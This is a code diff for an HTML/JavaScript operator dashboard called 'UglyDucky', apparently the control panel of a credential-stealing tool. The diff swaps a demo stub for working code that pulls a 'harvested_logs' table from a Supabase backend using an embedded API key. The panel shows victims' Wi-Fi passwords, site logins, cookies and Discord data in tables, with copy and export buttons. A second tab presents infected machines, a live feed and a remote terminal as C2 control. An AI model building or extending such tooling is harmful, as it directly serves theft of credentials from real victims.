@@ -56,8 +56,12 @@
         .fade-in { animation: fadeIn 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
         
-        .tab-content { display: none; }
-        .tab-content.active { display: block; animation: fadeIn 0.3s ease-in-out; }
+        /* Fixed Tab Switching */
+        .tab-content { display: none !important; }
+        .tab-content.active { display: flex !important; flex-direction: column; flex-grow: 1; animation: fadeIn 0.3s ease-in-out; }
+        
+        .blur-reveal { filter: blur(5px); transition: filter 0.3s; cursor: crosshair; }
+        .blur-reveal:hover { filter: blur(0px); }
 
         .cursor-blink::after { content: '█'; animation: blink 1s step-start infinite; color: #ff4757; margin-left: 4px; }
         @keyframes blink { 50% { opacity: 0; } }
@@ -72,15 +76,9 @@
 
         .tiling-col { display: flex; flex-direction: column; transition: flex-basis 0.2s ease; min-width: 200px; }
         .slot {
-            position: relative; 
-            flex: 1 1 auto; 
-            display: flex; 
-            flex-direction: column;
-            transition: flex-basis 0.2s ease;
-            min-height: 48px;
+            position: relative; flex: 1 1 auto; display: flex; flex-direction: column; transition: flex-basis 0.2s ease; min-height: 48px;
         }
 
-        /* Drop Zone Highlight */
         .slot.drag-over::before {
             content: ''; position: absolute; inset: 0; z-index: 50;
             background: rgba(0, 210, 211, 0.1); border: 2px dashed #00d2d3;
@@ -88,32 +86,24 @@
         }
 
         .win-panel {
-            width: 100%; height: 100%;
-            display: flex; flex-direction: column;
-            background: rgba(15, 20, 35, 0.95);
-            backdrop-filter: blur(12px); border: 1px solid rgba(255, 71, 87, 0.2);
-            border-radius: 0.75rem; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.7);
-            transition: opacity 0.2s ease;
+            width: 100%; height: 100%; display: flex; flex-direction: column;
+            background: rgba(15, 20, 35, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(255, 71, 87, 0.2);
+            border-radius: 0.75rem; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.7); transition: opacity 0.2s ease;
         }
-        
         .win-panel.dragging { opacity: 0.4; }
-
         .win-header { cursor: grab; user-select: none; flex-shrink: 0; }
         .win-header:active { cursor: grabbing; }
         .win-content { flex-grow: 1; overflow-y: auto; overflow-x: hidden; }
 
-        /* Minimize / Rollup State */
         .win-panel.collapsed { height: 48px !important; flex: 0 0 48px !important; border-bottom: 1px solid rgba(255, 71, 87, 0.5); }
         .win-panel.collapsed .win-content { display: none; }
 
-        /* Maximize (Fullscreen overlay) */
         .win-panel.maximized {
             position: fixed !important; inset: 2rem !important;
             width: calc(100% - 4rem) !important; height: calc(100% - 4rem) !important;
             z-index: 9999 !important; border-radius: 10px;
         }
 
-        /* Draggable Gutters (Resizers) */
         .resizer-v { cursor: col-resize; width: 12px; margin: 0 -6px; z-index: 10; position: relative; flex-shrink: 0; }
         .resizer-v::after { content: ''; position: absolute; left: 5px; top: 0; bottom: 0; width: 2px; background: rgba(255, 71, 87, 0.1); transition: 0.2s; }
         .resizer-v:hover::after, .resizer-v.active::after { background: #00d2d3; box-shadow: 0 0 8px #00d2d3; }
@@ -134,16 +124,32 @@
     <nav class="glass-panel border-b border-gray-800/80 sticky top-0 z-50">
         <div class="max-w-[95%] mx-auto px-4">
             <div class="flex items-center justify-between h-16">
-                <div class="flex items-center gap-3">
+                
+                <!-- Left: Logo -->
+                <div class="flex items-center gap-3 flex-1">
                     <i class="fa-solid fa-duck text-neon text-2xl text-glow"></i>
                     <span class="font-bold text-xl tracking-wider text-white uppercase">Ugly<span class="text-neon">Ducky</span> <span class="text-xs text-gray-500 font-mono tracking-normal ml-2 hidden sm:inline-block">v2.4.0_NIGHTLY</span></span>
                 </div>
+
+                <!-- Center: Navigation Tabs -->
+                <div class="flex-none flex justify-center">
+                    <div class="p-1.5 rounded-lg inline-flex gap-1 border border-gray-800 bg-[#050810]">
+                        <button onclick="switchTab('extraction')" id="tab-extraction" class="px-6 py-1.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]">
+                            <i class="fa-solid fa-database mr-2"></i> Vault Extraction
+                        </button>
+                        <button onclick="switchTab('rat')" id="tab-rat" class="px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5">
+                            <i class="fa-solid fa-network-wired mr-2"></i> C2 Live Control
+                        </button>
+                    </div>
+                </div>
                 
-                <div class="hidden md:flex items-center gap-6 font-mono text-xs">
+                <!-- Right: Status -->
+                <div class="hidden md:flex items-center gap-6 font-mono text-xs flex-1 justify-end">
                     <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_8px_#22c55e] animate-pulse"></span> <span class="text-gray-300">SERVER: ONLINE</span></div>
                     <div class="flex items-center gap-2 text-gray-400"><i class="fa-solid fa-satellite-dish text-cyberBlue"></i> PING: 24ms</div>
                     <div class="flex items-center gap-2 text-gray-400"><i class="fa-solid fa-shield-halved text-neon"></i> SEC: ENCRYPTED</div>
                 </div>
+
             </div>
         </div>
     </nav>
@@ -151,40 +157,50 @@
     <!-- Main Content -->
     <main class="flex-grow max-w-[95%] mx-auto px-2 py-8 w-full flex flex-col">
         
-        <!-- Navigation Tabs -->
-        <div class="flex justify-center mb-6 fade-in flex-shrink-0">
-            <div class="glass-panel p-1.5 rounded-lg inline-flex gap-1 border border-gray-800">
-                <button onclick="switchTab('extraction')" id="tab-extraction" class="px-8 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5">
-                    <i class="fa-solid fa-database mr-2"></i> Vault Extraction
-                </button>
-                <button onclick="switchTab('rat')" id="tab-rat" class="px-8 py-2.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]">
-                    <i class="fa-solid fa-network-wired mr-2"></i> C2 Live Control
-                </button>
-            </div>
-        </div>
-
         <!-- ========================================== -->
-        <!-- TAB 1: DATA EXTRACTION (Simplified for space) -->
+        <!-- TAB 1: DATA EXTRACTION (Private Login View)-->
         <!-- ========================================== -->
-        <div id="view-extraction" class="tab-content flex-grow">
+        <div id="view-extraction" class="tab-content active">
             <div class="text-center mb-8">
                 <h1 class="text-4xl md:text-5xl font-bold text-white mb-3 tracking-tight">Secure <span class="text-neon text-glow">Vault</span></h1>
                 <p class="text-gray-400 font-mono text-sm">Awaiting authentication parameters to decrypt harvested logs...</p>
             </div>
-            <div class="max-w-2xl mx-auto glass-panel p-8 rounded-2xl glow-border relative">
-                <div class="flex gap-3">
-                    <input type="text" id="deviceId" placeholder="Enter Ducky ID" class="w-full px-4 py-3 bg-[#050810] border border-gray-700 rounded-lg text-white font-mono shadow-inner outline-none focus:border-neon">
-                    <button onclick="fetchData()" id="connectBtn" class="bg-neon hover:bg-neonHover text-white font-bold px-8 rounded-lg transition-all shadow-[0_0_20px_rgba(255,71,87,0.4)]">Decrypt</button>
+
+            <!-- Input Section -->
+            <div class="max-w-2xl mx-auto glass-panel p-8 rounded-2xl glow-border mb-8 relative overflow-hidden">
+                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-neon to-transparent opacity-50"></div>
+                <label class="block text-xs font-bold text-cyberBlue mb-3 uppercase tracking-widest"><i class="fa-solid fa-microchip mr-2"></i>Target Identifier</label>
+                <div class="flex flex-col sm:flex-row gap-3">
+                    <div class="relative flex-grow">
+                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                            <i class="fa-solid fa-fingerprint text-gray-500"></i>
+                        </div>
+                        <input type="text" id="deviceId" placeholder="Enter Ducky ID (e.g. JOHNS_DUCKY)" autocomplete="off" 
+                            class="block w-full pl-12 pr-4 py-4 bg-[#050810] border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-neon focus:border-transparent transition-all font-mono text-lg shadow-inner">
+                    </div>
+                    <button onclick="fetchData()" id="connectBtn" class="bg-neon hover:bg-neonHover text-white font-bold py-4 px-8 rounded-lg transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(255,71,87,0.4)]">
+                        <i class="fa-solid fa-unlock-keyhole"></i> Decrypt
+                    </button>
+                </div>
+                
+                <div class="flex justify-between items-center mt-4">
+                    <p id="statusMsg" class="text-sm font-mono text-gray-400 hidden"></p>
+                    <button id="exportBtn" class="hidden text-xs font-mono bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded transition-colors">
+                        <i class="fa-solid fa-download mr-1"></i> Export Logs
+                    </button>
                 </div>
             </div>
-            <div id="output" class="mt-8 max-w-2xl mx-auto"></div>
+
+            <!-- Filters -->
+            <div id="filterContainer" class="hidden max-w-7xl mx-auto mb-6 flex flex-wrap gap-2 justify-center border-b border-gray-800/50 pb-8"></div>
+            <!-- Results -->
+            <div id="output" class="grid grid-cols-1 lg:grid-cols-2 2xl:grid-cols-3 gap-6 pb-20"></div>
         </div>
 
         <!-- ========================================== -->
         <!-- TAB 2: LIVE CONTROL (Tiling Window UI)     -->
         <!-- ========================================== -->
-        <div id="view-rat" class="tab-content active flex-grow flex flex-col h-full">
-            
+        <div id="view-rat" class="tab-content">
             <div class="flex justify-between items-center mb-4 px-2">
                 <div class="font-mono text-xs text-cyberBlue"><i class="fa-solid fa-border-all mr-2"></i>Hypr-Tiling Active <span class="text-gray-500 ml-2">(Drag headers to swap slots. Drag gutters to resize.)</span></div>
                 <button onclick="resetLayout()" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs font-mono rounded border border-gray-700 transition-colors">
@@ -194,11 +210,9 @@
 
             <!-- Tiling Workspace -->
             <div id="workspace">
-                
                 <!-- LEFT COLUMN -->
                 <div id="col-left" class="tiling-col" style="flex-basis: 25%;">
                     <div class="slot" id="slot-1">
-                        <!-- Panel: Targets -->
                         <div id="panel-targets" class="win-panel" data-minimized="false">
                             <div class="win-header p-3 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center" draggable="true">
                                 <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-crosshairs text-neon mr-2 text-glow"></i>Infected Nodes</h2>
@@ -213,10 +227,7 @@
                                     <div class="flex justify-between items-start mb-2 pl-2">
                                         <div class="flex items-center gap-2">
                                             <i class="fa-brands fa-windows text-cyberBlue text-lg"></i>
-                                            <div>
-                                                <p class="text-sm font-bold text-white">DESKTOP-Q1A2Z</p>
-                                                <p class="text-[10px] text-gray-400 font-mono">192.168.1.44</p>
-                                            </div>
+                                            <div><p class="text-sm font-bold text-white">DESKTOP-Q1A2Z</p><p class="text-[10px] text-gray-400 font-mono">192.168.1.44</p></div>
                                         </div>
                                         <span class="w-2.5 h-2.5 rounded-full bg-green-500 animate-pulse"></span>
                                     </div>
@@ -240,9 +251,7 @@
 
                 <!-- MIDDLE COLUMN -->
                 <div id="col-mid" class="tiling-col" style="flex-basis: 50%;">
-                    
                     <div class="slot" id="slot-2" style="flex-basis: 50%;">
-                        <!-- Panel: Video -->
                         <div id="panel-video" class="win-panel" data-minimized="false">
                             <div class="win-header p-3 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center" draggable="true">
                                 <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-video text-purple-400 mr-2"></i>Live Feed</h2>
@@ -266,7 +275,6 @@
                     <div class="resizer-h" id="rz-h1"></div>
 
                     <div class="slot" id="slot-3" style="flex-basis: 50%;">
-                        <!-- Panel: Terminal -->
                         <div id="panel-terminal" class="win-panel" data-minimized="false">
                             <div class="win-header p-2 border-b border-gray-800 bg-[#0B0F19] flex justify-between items-center" draggable="true">
                                 <div class="flex gap-1.5 ml-2 pointer-events-none">
@@ -292,7 +300,6 @@
                             </div>
                         </div>
                     </div>
-
                 </div>
 
                 <!-- Resizer Vertical 2 -->
@@ -301,7 +308,6 @@
                 <!-- RIGHT COLUMN -->
                 <div id="col-right" class="tiling-col" style="flex-basis: 25%;">
                     <div class="slot" id="slot-4">
-                        <!-- Panel: Modules -->
                         <div id="panel-modules" class="win-panel" data-minimized="false">
                             <div class="win-header p-3 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center" draggable="true">
                                 <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-bolt text-yellow-400 mr-2"></i>Modules</h2>
@@ -343,7 +349,6 @@
                         </div>
                     </div>
                 </div>
-
             </div>
         </div>
     </main>
@@ -384,20 +389,183 @@
     </div>
 
     <script>
-        // --- TILING WINDOW MANAGER (DRAG & DROP SWAPPING) ---
+        // --- TAB LOGIC ---
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            
+            // Reset buttons
+            document.getElementById('tab-extraction').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
+            document.getElementById('tab-rat').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
+            
+            // Activate target
+            document.getElementById('view-' + tabId).classList.add('active');
+            document.getElementById('tab-' + tabId).className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]";
+        }
+
+        // --- FULL EXTRACTION LOGIC (Restored Database/API Code) ---
+        const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
+        const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
+        let globalData = [];
+
+        document.getElementById("deviceId").addEventListener("keypress", function(e) {
+            if (e.key === "Enter") { e.preventDefault(); fetchData(); }
+        });
+
+        async function fetchData() {
+            const deviceId = document.getElementById('deviceId').value.trim();
+            const outputDiv = document.getElementById('output');
+            const statusMsg = document.getElementById('statusMsg');
+            const btn = document.getElementById('connectBtn');
+            const exportBtn = document.getElementById('exportBtn');
+            const filterContainer = document.getElementById('filterContainer');
+            
+            if (!deviceId) return showToast("Target Identifier missing.", "error");
+
+            statusMsg.classList.remove('hidden');
+            statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-neon mr-2"></i>Decrypting vault nodes...';
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
+            outputDiv.innerHTML = "";
+            filterContainer.classList.add('hidden');
+            exportBtn.classList.add('hidden');
+
+            try {
+                const response = await fetch(`${SUPABASE_URL}?device_id=eq.${deviceId}&order=created_at.desc`, {
+                    method: 'GET',
+                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' }
+                });
+
+                if (!response.ok) throw new Error("API Error");
+
+                globalData = await response.json();
+
+                if (globalData.length === 0) {
+                    statusMsg.innerHTML = '<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>No payload data found for this ID.';
+                } else {
+                    statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
+                    exportBtn.classList.remove('hidden');
+                    buildFilters();
+                    renderCards(globalData);
+                    showToast("Vault Extracted Successfully");
+                }
+            } catch (error) {
+                statusMsg.innerHTML = `<i class="fa-solid fa-xmark text-red-500 mr-2"></i>Handshake failed.`;
+                showToast("Connection to Server Failed", "error");
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole"></i> Decrypt';
+            }
+        }
+
+        function buildFilters() {
+            const container = document.getElementById('filterContainer');
+            container.innerHTML = '';
+            container.classList.remove('hidden');
+
+            const categories = [...new Set(globalData.map(item => item.category))];
+            container.appendChild(createFilterBtn('All', true));
+            categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
+        }
+
+        function createFilterBtn(text, isActive) {
+            const btn = document.createElement('button');
+            const activeClasses = 'bg-neon/20 text-neon font-bold border-neon shadow-[0_0_10px_rgba(255,71,87,0.2)]';
+            const inactiveClasses = 'bg-[#0f1423] text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
+            btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
+            btn.innerText = text;
+            
+            btn.onclick = () => {
+                document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${inactiveClasses}`);
+                btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${activeClasses}`;
+                renderCards(text === 'All' ? globalData : globalData.filter(item => item.category === text));
+            };
+            return btn;
+        }
+
+        function renderCards(data) {
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML = '';
+
+            data.forEach((item, index) => {
+                let icon = 'fa-file-code'; let color = 'text-neon';
+                if(item.category.includes('Wi-Fi')) { icon = 'fa-wifi'; color = 'text-blue-400'; }
+                if(item.category.includes('System')) { icon = 'fa-server'; color = 'text-green-400'; }
+                if(item.category.includes('Password') || item.category.includes('Cred')) { icon = 'fa-key'; color = 'text-yellow-400'; }
+                if(item.category.includes('Cookie')) { icon = 'fa-cookie-bite'; color = 'text-orange-400'; }
+                if(item.category.includes('Discord')) { icon = 'fa-discord'; color = 'text-indigo-400'; }
+
+                const htmlContent = parseToHTML(item.category, item.content);
+                const card = document.createElement('div');
+                card.className = `glass-panel rounded-xl overflow-hidden fade-in flex flex-col h-full border border-gray-800 hover:border-gray-600 transition-colors`;
+                card.style.animationDelay = `${index * 0.05}s`;
+                
+                card.innerHTML = `
+                    <div class="px-4 py-3 border-b border-gray-800 flex justify-between items-center bg-[#050810]">
+                        <div class="flex items-center gap-2"><i class="fa-solid ${icon} ${color}"></i><h3 class="font-bold text-gray-200 text-xs uppercase tracking-widest">${item.category}</h3></div>
+                        <div class="flex items-center gap-3">
+                            <span class="text-[10px] font-mono text-gray-500">${new Date(item.created_at).toLocaleString()}</span>
+                            <button onclick="copyData(this)" class="text-gray-500 hover:text-white transition-colors p-1" title="Copy Raw"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+                    <div class="p-0 flex-grow bg-[#0f1423] max-h-[350px] overflow-y-auto">
+                        <textarea class="hidden-raw-data hidden">${item.content}</textarea>
+                        ${htmlContent}
+                    </div>
+                `;
+                outputDiv.appendChild(card);
+            });
+        }
+
+        function parseToHTML(category, content) {
+            let defaultRaw = `<pre class="p-4 font-mono text-xs text-cyberBlue whitespace-pre-wrap break-all">${escapeHtml(content)}</pre>`;
+            try {
+                if (category.includes('Wi-Fi')) {
+                    const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
+                    let rows = blocks.map(block => {
+                        let ssid = (block.match(/SSID:\s*(.*)/i) || [])[1] || 'Unknown';
+                        let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
+                        return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="px-4 py-2.5 text-blue-400 font-bold">${escapeHtml(ssid)}</td><td class="px-4 py-2.5 font-mono text-white blur-reveal rounded">${escapeHtml(pass)}</td></tr>`;
+                    }).join('');
+                    return rows ? `<table class="w-full text-left text-xs"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2">Network (SSID)</th><th class="p-2">Password</th></tr></thead><tbody>${rows}</tbody></table>` : defaultRaw;
+                }
+                if (category.includes('Password') || category.includes('Cred')) {
+                    const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
+                    let rows = blocks.map(block => {
+                        let url = (block.match(/(?:URL|HOST):\s*(.*)/i) || [])[1] || 'N/A';
+                        let user = (block.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
+                        let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
+                        return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="p-2 text-yellow-400 truncate max-w-[100px]">${escapeHtml(url)}</td><td class="p-2 text-gray-300 truncate">${escapeHtml(user)}</td><td class="p-2 font-mono text-white blur-reveal rounded">${escapeHtml(pass)}</td></tr>`;
+                    }).join('');
+                    return rows ? `<table class="w-full text-left text-xs"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2">Target</th><th class="p-2">User</th><th class="p-2">Pass</th></tr></thead><tbody>${rows}</tbody></table>` : defaultRaw;
+                }
+            } catch (e) { return defaultRaw; }
+            return defaultRaw;
+        }
+
+        function escapeHtml(unsafe) {
+            return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+        }
+
+        function copyData(btnElement) {
+            const dataToCopy = btnElement.closest('.glass-panel').querySelector('.hidden-raw-data').value;
+            navigator.clipboard.writeText(dataToCopy).then(() => {
+                showToast("Raw payload copied to clipboard");
+                const icon = btnElement.querySelector('i');
+                icon.className = "fa-solid fa-check text-green-400";
+                setTimeout(() => icon.className = "fa-regular fa-copy text-gray-500", 2000);
+            });
+        }
+
+        // --- TILING WINDOW MANAGER LOGIC ---
         let draggedPanel = null;
 
         document.querySelectorAll('.win-header').forEach(header => {
             header.addEventListener('dragstart', (e) => {
-                // Prevent drag if maximizing/minimizing buttons were clicked
-                if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized')) {
-                    e.preventDefault(); return;
-                }
+                if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized')) { e.preventDefault(); return; }
                 draggedPanel = header.closest('.win-panel');
                 e.dataTransfer.effectAllowed = 'move';
                 setTimeout(() => draggedPanel.classList.add('dragging'), 0);
             });
-
             header.addEventListener('dragend', () => {
                 if(draggedPanel) draggedPanel.classList.remove('dragging');
                 draggedPanel = null;
@@ -407,25 +575,16 @@
 
         document.querySelectorAll('.slot').forEach(slot => {
             slot.addEventListener('dragover', (e) => {
-                e.preventDefault(); // Necessary to allow dropping
-                if(draggedPanel && slot !== draggedPanel.parentElement) {
-                    slot.classList.add('drag-over');
-                }
+                e.preventDefault(); 
+                if(draggedPanel && slot !== draggedPanel.parentElement) slot.classList.add('drag-over');
             });
-
-            slot.addEventListener('dragleave', () => {
-                slot.classList.remove('drag-over');
-            });
-
+            slot.addEventListener('dragleave', () => slot.classList.remove('drag-over'));
             slot.addEventListener('drop', (e) => {
                 e.preventDefault();
                 slot.classList.remove('drag-over');
-                
                 if (draggedPanel) {
                     const targetPanel = slot.querySelector('.win-panel');
                     const sourceSlot = draggedPanel.parentElement;
-                    
-                    // Perform the Swap!
                     if (targetPanel && sourceSlot !== slot) {
                         sourceSlot.appendChild(targetPanel);
                         slot.appendChild(draggedPanel);
@@ -434,34 +593,24 @@
             });
         });
 
-        // --- TILING WINDOW MANAGER (GUTTER RESIZERS) ---
         function setupResizer(resizerId, prevId, nextId, isVertical) {
             const resizer = document.getElementById(resizerId);
             const prev = document.getElementById(prevId);
             const next = document.getElementById(nextId);
             
             resizer.addEventListener('mousedown', (e) => {
-                e.preventDefault();
-                resizer.classList.add('active');
-                
-                // Disable transitions during drag for smooth performance
-                prev.style.transition = 'none';
-                next.style.transition = 'none';
+                e.preventDefault(); resizer.classList.add('active');
+                prev.style.transition = 'none'; next.style.transition = 'none';
 
                 const startPos = isVertical ? e.clientX : e.clientY;
                 const parentSize = isVertical ? resizer.parentElement.offsetWidth : resizer.parentElement.offsetHeight;
-                
                 const prevStartBasis = (prev[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;
                 const nextStartBasis = (next[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;
 
                 const onMouseMove = (moveEvent) => {
                     const delta = isVertical ? moveEvent.clientX - startPos : moveEvent.clientY - startPos;
                     const deltaPercent = (delta / parentSize) * 100;
-                    
-                    let newPrev = prevStartBasis + deltaPercent;
-                    let newNext = nextStartBasis - deltaPercent;
-
-                    // Min size constraint (15%)
+                    let newPrev = prevStartBasis + deltaPercent; let newNext = nextStartBasis - deltaPercent;
                     if (newPrev > 15 && newNext > 15) {
                         prev.style.flexBasis = `${newPrev}%`;
                         next.style.flexBasis = `${newNext}%`;
@@ -470,8 +619,7 @@
 
                 const onMouseUp = () => {
                     resizer.classList.remove('active');
-                    prev.style.transition = '';
-                    next.style.transition = '';
+                    prev.style.transition = ''; next.style.transition = '';
                     document.removeEventListener('mousemove', onMouseMove);
                     document.removeEventListener('mouseup', onMouseUp);
                 };
@@ -481,22 +629,17 @@
             });
         }
 
-        // Initialize Resizers
         document.addEventListener("DOMContentLoaded", () => {
             setupResizer('rz-v1', 'col-left', 'col-mid', true);
             setupResizer('rz-v2', 'col-mid', 'col-right', true);
             setupResizer('rz-h1', 'slot-2', 'slot-3', false);
         });
 
-        // --- WINDOW CONTROLS (Min/Max) ---
         function toggleMinimize(btn, panelId) {
-            // Find btn based on context. If it's a click, btn is the button.
-            // If it's the <i> tag inside, get parent.
             const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
             const panel = document.getElementById(panelId);
             const isMinimized = panel.dataset.minimized === 'true';
             
-            // Cannot minimize if fullscreened
             if(panel.classList.contains('maximized')) return;
 
             if (isMinimized) {
@@ -505,7 +648,7 @@
                 panel.classList.remove('collapsed');
             } else {
                 panel.dataset.minimized = 'true';
-                buttonEl.innerHTML = '<i class="fa-solid fa-window-restore"></i>'; // Changed Icon!
+                buttonEl.innerHTML = '<i class="fa-solid fa-window-restore"></i>';
                 panel.classList.add('collapsed');
             }
         }
@@ -513,15 +656,12 @@
         function toggleMaximize(btn, panelId) {
             const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
             const panel = document.getElementById(panelId);
-            const isMax = panel.classList.contains('maximized');
             
-            if (isMax) {
+            if (panel.classList.contains('maximized')) {
                 panel.classList.remove('maximized');
                 buttonEl.innerHTML = '<i class="fa-solid fa-expand"></i>';
             } else {
-                // Prevent maximizing a collapsed window
                 if(panel.dataset.minimized === 'true') toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, panelId);
-                
                 panel.classList.add('maximized');
                 buttonEl.innerHTML = '<i class="fa-solid fa-compress"></i>';
             }
@@ -534,49 +674,19 @@
             document.getElementById('slot-2').style.flexBasis = '50%';
             document.getElementById('slot-3').style.flexBasis = '50%';
             
-            // Un-minimize and un-maximize everything
-            document.querySelectorAll('.win-panel').forEach(p => {
-                p.classList.remove('maximized', 'collapsed');
-                p.dataset.minimized = 'false';
-            });
+            document.querySelectorAll('.win-panel').forEach(p => { p.classList.remove('maximized', 'collapsed'); p.dataset.minimized = 'false'; });
             document.querySelectorAll('.win-header button .fa-window-restore').forEach(i => i.className = "fa-solid fa-minus");
             document.querySelectorAll('.win-header button .fa-compress').forEach(i => i.className = "fa-solid fa-expand");
-
             showToast('Layout Reset', 'success');
-        }
-
-        // --- TAB LOGIC ---
-        function switchTab(tabId) {
-            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-            document.getElementById('tab-extraction').className = "px-8 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
-            document.getElementById('tab-rat').className = "px-8 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
-            
-            document.getElementById('view-' + tabId).classList.add('active');
-            document.getElementById('tab-' + tabId).className = "px-8 py-2.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]";
-        }
-
-        function fetchData() {
-            const btn = document.getElementById('connectBtn');
-            const output = document.getElementById('output');
-            btn.innerHTML = 'Working...';
-            setTimeout(() => {
-                btn.innerHTML = 'Decrypt';
-                output.innerHTML = `<div class="glass-panel p-4 rounded-xl text-center text-gray-400 border border-neon font-mono text-sm">Demo Data. Switch to C2 Live Control tab.</div>`;
-                showToast("Vault Decrypted");
-            }, 1000);
         }
 
         // --- TERMINAL LOGIC ---
         function termLog(msg) {
             const term = document.getElementById('terminal-output');
             term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', '');
-            const line = document.createElement('div');
-            line.className = "text-gray-300 mt-1";
-            line.innerText = `[*] ${msg}`;
+            const line = document.createElement('div'); line.className = "text-gray-300 mt-1"; line.innerText = `[*] ${msg}`;
             term.appendChild(line);
-            const prompt = document.createElement('div');
-            prompt.className = "mt-2 text-green-400";
-            prompt.innerHTML = `C:\\Users\\John> <span class="cursor-blink"></span>`;
+            const prompt = document.createElement('div'); prompt.className = "mt-2 text-green-400"; prompt.innerHTML = `C:\\Users\\John> <span class="cursor-blink"></span>`;
             term.appendChild(prompt);
             term.scrollTop = term.scrollHeight;
         }
@@ -595,7 +705,17 @@
 
         function showToast(msg, type="success") {
             const toast = document.getElementById('toast');
+            const icon = toast.querySelector('i');
             document.getElementById('toastMsg').innerText = msg;
+            
+            if(type === "error") {
+                toast.classList.replace('border-neon', 'border-red-500');
+                icon.className = "fa-solid fa-triangle-exclamation text-red-500";
+            } else {
+                toast.classList.replace('border-red-500', 'border-neon');
+                icon.className = "fa-solid fa-circle-check text-neon";
+            }
+
             toast.classList.replace('translate-y-24', 'translate-y-0');
             toast.classList.replace('opacity-0', 'opacity-100');
             setTimeout(() => {
